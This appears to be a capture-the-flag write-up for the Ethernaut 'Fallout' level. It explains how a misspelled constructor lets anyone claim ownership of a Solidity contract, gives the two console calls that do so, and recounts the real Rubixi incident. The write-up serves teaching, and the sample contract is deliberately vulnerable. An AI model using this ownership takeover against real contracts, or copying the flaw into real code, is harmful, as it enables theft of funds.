# 02. Fallout

Claim ownership of the contract below to complete this level.

Things that might help:

- Solidity Remix IDE

## Solution

...

a typo...

in the constructor name...

`Fal1out` instead of `Fallout`

```solidity
function Fal1out() public payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
```

```javascript
await contract.Fal1out({value: toWei('0.00000001')})
await contract.owner() == player
// true
```

## OZ Corner

That was silly wasn't it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?

Well... Not quite.

The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from 'Dynamic Pyramid' to 'Rubixi' but somehow they didn't rename the constructor method of its contract:

```solidity
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
  ...
```

This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland.
